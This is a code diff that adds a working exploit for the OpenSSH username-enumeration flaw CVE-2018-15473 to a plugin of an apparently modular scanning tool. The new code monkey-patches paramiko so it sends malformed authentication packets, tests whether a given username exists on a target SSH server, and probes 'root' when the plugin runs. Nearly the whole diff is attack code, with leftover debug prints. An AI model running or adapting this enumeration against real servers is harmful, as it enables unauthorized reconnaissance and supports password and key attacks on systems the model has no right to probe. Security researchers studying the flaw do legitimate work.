@@ -1,4 +1,4 @@
-#!/usr/bin/env python3.5
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -12,8 +12,66 @@ https://www.exploit-db.com/exploits/45233
 https://github.com/Rhynorater/CVE-2018-15473-Exploit
 
 """
+
+import warnings
+
+
+
+
+
+import paramiko
 import core.logger as log
 from plugins.IPlugin import IPlugin, connection_type
+
+old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+
+class BadUsername(Exception):
+	def __init__(self):
+		pass
+
+def add_boolean(*args, **kwargs):
+    pass
+
+def call_error(*args, **kwargs):
+    raise BadUsername()
+
+def malform_packet(*args, **kwargs):
+	print("forge malgormed")
+	old_add_boolean = paramiko.message.Message.add_boolean
+	paramiko.message.Message.add_boolean = add_boolean
+	result  = old_parse_service_accept(*args, **kwargs)
+	paramiko.message.Message.add_boolean = old_add_boolean
+	return result
+
+paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
+
+def checkUsername(socket, username, tried=0):
+	transport = paramiko.transport.Transport(socket)
+	try:
+		print("try")
+		transport.start_client()
+		a = transport.get_banner()
+		if a:
+			print("BANNER=>", a)
+		print("clean")
+	except paramiko.ssh_exception.SSHException:
+		print("EXCEPTION no ", tried)
+		transport.close()
+		if tried < 3:
+			tried += 1
+			return checkUsername(socket, username, tried)
+		else:
+			print ('[-] Failed to negotiate SSH transport')
+
+	try:
+		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
+	except BadUsername:
+			return (username, False)
+	except paramiko.ssh_exception.AuthenticationException:
+			return (username, True)
+	raise Exception("There was an error. Is this the correct version of OpenSSH?")	
+	pass
 
 class Plugin(IPlugin):
 	def __init__(self):
@@ -24,6 +82,10 @@ class Plugin(IPlugin):
 	def config(self):
 		pass
 
-	def exec(self, connection):
+	def exec(self, socket):
+		print("exec")
+		res = checkUsername(socket, "root")
+		if res:
+			print("->",res)
 		log.info("Running my custom plugin")
 		pass
